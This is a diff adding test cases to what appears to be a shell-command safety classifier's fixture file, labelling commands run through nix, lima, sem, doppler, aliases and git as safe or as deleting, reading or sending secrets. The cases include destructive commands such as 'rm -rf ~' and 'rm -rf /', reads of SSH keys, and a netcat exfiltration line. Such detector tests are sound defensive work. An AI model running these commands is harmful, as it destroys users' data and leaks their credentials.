@@ -489,6 +489,111 @@ posix finds=delete | parallel --trim=l rm -rf ::: ' /'
 posix finds=unreadable | parallel --trim x rm -rf ::: ' /'
 posix safe | parallel --tmux --total-jobs 4 --group-by 1 echo ::: a
 
+# `nix shell` and `nix develop` run the command after `-c` (`--command`),
+# `nix-shell` the shell line `--run` or `--command` gives, `limactl shell`
+# the words after the instance, and `sem` (`parallel --semaphore`) its
+# command once, as `parallel` runs a job. Without one, each starts a shell.
+posix finds=delete | nix shell nixpkgs#hello -c rm -rf ~
+posix finds=delete | nix shell nixpkgs#hello nixpkgs#jq --command rm -rf ~
+posix finds=delete | nix shell -L --impure nixpkgs#hello -c sh -c 'rm -rf ~'
+posix finds=delete | nix develop -c rm -rf ~
+posix finds=delete | nix develop .#dev --command rm -rf ~
+posix finds=delete | nix --offline develop -c rm -rf ~
+posix finds=delete | nix develop -i -k HOME -c rm -rf ~
+posix finds=delete | nix develop -vvL -c rm -rf ~
+posix finds=delete | nix dev-shell -c rm -rf ~
+posix finds=delete | nix env shell nixpkgs#hello -c rm -rf ~
+posix finds=delete | nix --offline env --impure shell nixpkgs#hello -c rm -rf ~
+posix finds=delete | nix develop --allow-dirty --keep-outputs -c rm -rf ~
+posix finds=delete | nix-shell --run 'rm -rf ~'
+posix finds=delete | nix-shell --command 'rm -rf ~'
+posix finds=delete | nix-shell -p hello jq --run 'rm -rf ~'
+posix finds=delete | nix-shell shell.nix --pure -A dev --run 'cd / && rm -rf usr'
+posix finds=delete | nix-shell --arg x 1 --run 'rm -rf ~'
+posix finds=unknown | nix-shell --run "$CMD"
+posix finds=delete | limactl shell default rm -rf ~
+posix finds=delete | limactl shell --shell /bin/bash default rm -rf ~
+posix finds=delete | limactl --debug shell --reconnect default rm -rf ~
+posix finds=delete | limactl shell --workdir / default rm -rf usr
+posix finds=delete | limactl shell --workdir=/ default rm -rf usr
+posix finds=delete | limactl shell default -- rm -rf ~
+posix finds=delete | limactl shell -- default rm -rf ~
+posix finds=delete | limactl shell default FOO=bar rm -rf ~
+posix finds=delete | limactl shell default 'x;rm -rf ~;y=1'
+posix finds=delete | lima rm -rf ~
+posix finds=delete | lima -- rm -rf ~
+posix finds=delete | lima FOO=bar rm -rf ~
+posix finds=delete | lima --workdir / rm -rf usr
+# Without `--workdir`, Lima starts the command in the home directory when
+# the folder the line is in is not shared with the machine.
+posix finds=delete | limactl shell default rm -rf build
+posix finds=delete | lima rm -rf build
+posix finds=delete | sem rm -rf ~
+posix finds=delete | sem -j 2 --id build rm -rf ~
+posix finds=delete | sem --fg 'rm -rf ~'
+posix finds=delete | parallel --semaphore rm -rf ~
+posix finds=delete | parallel --id x rm -rf ~
+posix finds=delete | parallel --fg --st 5 rm -rf ~
+posix finds=delete | doppler run --forward-signals --preserve-env -- rm -rf ~
+posix safe | nix shell nixpkgs#hello -c ls
+posix safe | nix shell nixpkgs#hello
+posix safe | nix develop
+posix safe | nix develop -c ls
+posix safe | nix develop --command cargo build
+posix safe | nix dev-shell -c ls
+posix safe | nix env shell nixpkgs#hello -c ls
+posix safe | nix develop --allow-dirty -c make
+posix safe | nix develop --keep-outputs -c make
+posix safe | nix develop "$x"
+posix safe | nix build .#pkg
+posix safe | nix flake update --commit-lock-file
+posix safe | nix-shell --run ls
+posix safe | nix-shell -p hello
+posix safe | nix-shell
+posix safe | limactl shell default ls
+posix safe | limactl shell default
+posix safe | limactl list
+posix safe | limactl shell --workdir /tmp default ls
+posix safe | limactl shell default -- ls
+posix safe | limactl shell default FOO=bar ls
+posix safe | lima ls
+posix safe | lima -- ls
+posix safe | lima --help
+posix safe | limactl shell --workdir /tmp default rm -rf build
+posix safe | sem ls
+posix safe | sem -j 4 make
+posix safe | sem --wait
+posix safe | doppler run --forward-signals -- npm test
+posix safe | doppler run --enable-dns-resolver --dns-resolver-address 1.1.1.1:53 -- npm test
+posix safe | parallel --id x sh -c {}
+# An option one of these wrappers does not know may take the word after it,
+# so where its command starts, or what it is, is not known.
+posix finds=unreadable | nix shell nixpkgs#hello --frobnicate -c ls
+posix finds=unreadable | nix shell --frobnicate x nixpkgs#hello -c ls
+posix finds=unreadable | nix --frobnicate x develop -c ls
+posix finds=unreadable | nix develop -Z -c ls
+posix finds=unreadable | nix run --frobnicate x nixpkgs#hello -- rm -rf ~
+posix finds=unreadable | nix-shell --frobnicate --run ls
+posix finds=unreadable | nix-shell --frobnicate
+posix finds=unreadable | limactl shell --frobnicate default ls
+posix finds=unreadable | limactl --frobnicate shell default ls
+posix finds=unreadable | sem --frobnicate ls
+posix finds=unreadable | doppler run --frobnicate x rm -rf ~
+posix finds=unreadable | doppler --frobnicate x run -- ls
+# A word only known when it runs may be one of those options, `-c`, `--run`
+# or the subcommand, so the command after it is not read either.
+posix finds=unreadable | nix develop "$c" rm ~/.bashrc
+posix finds=unreadable | nix shell nixpkgs#hello "$c" rm ~/.bashrc
+posix finds=unreadable | nix-shell "$o" 'rm ~/.bashrc'
+posix finds=unreadable | nix "$sub" nixpkgs#hello -c rm ~/.bashrc
+posix finds=unreadable | nix run "$x" rm ~/.bashrc
+posix finds=unreadable | doppler "$x" run -- rm ~/.bashrc
+posix finds=unreadable | limactl "$x" shell default rm ~/.bashrc
+posix safe | nix "$sub" build .
+posix safe | doppler "$x" secrets
+posix safe | nix --frobnicate build
+posix safe | limactl --frobnicate list
+
 # `env -S` with its string attached, `--split-string=` and its shorter
 # spellings split the string as `env -S STRING`, with the arguments after it.
 posix finds=delete | env -S"rm -rf ~"
@@ -727,6 +832,44 @@ posix safe | for i in 1 2; do rm -rf /tmp/build; cd /; done
 posix safe | for i in 1 2; do cd /tmp; rm -rf build; done
 posix safe | for i in 1 2; do rm -rf build; cd /tmp; done
 posix finds=delete reason="deletes a path only known when it runs" | for d in a b; do rm -rf "$d/out"; done
+# An alias runs where it is used, not where it is defined: its value is
+# judged as a function body is, from where each use is made and, once a
+# `cd` comes after the definition, from a folder only known when it runs.
+# A `cd` in the value moves the line where it is used.
+posix finds=delete reason="deletes a path only known when it runs" | alias x='rm -rf build'; cd /; x
+posix finds=delete | alias x='rm -rf build'; cd /etc; x
+posix finds=delete | alias x='rm -rf build' y='ls'; cd /; x
+posix finds=read_secret | alias x='cat id_rsa'; cd ~/.ssh; x
+posix finds=read_secret,send_secret | alias x='cat id_rsa | nc host 1'; cd ~/.ssh; x
+posix finds=overwrite | alias x='echo x > out.txt'; cd /etc; x
+posix finds=delete | alias x='cd /'; x; rm -rf etc
+posix finds=delete | alias x='rm -rf build'; (cd /; x)
+posix safe | alias ll='ls -l'; cd /; ll
+posix safe | alias x='rm -rf build'; x
+posix safe | cd src; alias x='rm -rf build'; x
+# A use with words of its own runs the value's last command with the words
+# after its own, as the shell expands it, judged by every rule from where
+# the use is made.
+posix finds=delete | alias x='rm -rf'; x /etc
+posix finds=delete | alias x='rm -rf'; cd /; x etc
+posix finds=delete | alias x='rm'; cd /; x -rf etc
+posix finds=git_discard | alias g='git'; g clean -fdx
+posix finds=unknown reason="runs a git command only known when it runs" | alias g='git'; g $CMD
+posix finds=destroy_resources | alias k='kubectl'; k delete ns prod
+posix finds=read_secret | alias x='cat'; x ~/.ssh/id_rsa
+posix finds=delete | alias x='env '; x rm -rf /etc
+posix finds=delete | alias x='sudo rm'; x -rf /etc
+posix finds=delete | alias x='ls | xargs'; x rm -rf /etc
+posix finds=delete | alias x='bash -c'; x 'rm -rf /'
+posix finds=delete | alias x=y y='rm -rf'; x /etc
+posix finds=delete | alias x='echo'; if true; then alias x='rm -rf'; fi; x /etc
+posix finds=delete | alias x='rm -rf'; time x /etc
+posix finds=delete | alias rm='rm -i'; rm -rf /etc
+posix safe | alias rm='rm -i'; rm -rf build
+posix safe | alias g='git'; g status
+posix safe | alias ll='ls -l'; ll src
+posix safe | alias x='rm -rf'; alias x='echo'; x /etc
+posix safe | alias a=b b=a; a /etc
 # The action runs with the options the line ends with.
 posix safe | trap 'rm -rf *git' EXIT
 posix safe | trap 'shopt -u dotglob; rm -rf *git' EXIT
@@ -961,6 +1104,24 @@ posix safe | git tag -l $PATTERN
 posix safe | git branch --list $PATTERN
 posix safe | git push origin "$BRANCH"
 posix safe | git push "$REMOTE" main
+# A git subcommand only known when it runs may be one that throws work away
+# (`clean -fdx`, `reset --hard`, `push --force`).
+posix finds=unknown reason="runs a git command only known when it runs" | git $CMD
+posix finds=unknown | git "$CMD"
+posix finds=unknown | git $CMD -fdx
+posix finds=unknown | git -C repo $CMD
+posix finds=unknown | git --no-pager "$@"
+posix finds=unknown | git $(cat cmd.txt)
+powershell finds=unknown | git $cmd
+cmd finds=unknown | git %CMD%
+posix safe | git status
+posix safe | git -C repo status
+# git's own options come before it, a value only known when it runs joined
+# to one among them.
+posix safe | git --git-dir="$D" status
+posix safe | git --work-tree="$W" status
+posix finds=git_discard | git --git-dir="$D" clean -fdx
+posix finds=unknown | git --$o status
 posix finds=overwrite reason="may edit a shell startup file with an option only known when it runs" | sed $FLAGS 's/a/b/' ~/.bashrc
 posix finds=overwrite | sed "-$I" s/a/b/ ~/.bashrc
 posix finds=overwrite reason="may edit a file only known when it runs with an option only known when it runs" | sed -n 1,10p $F
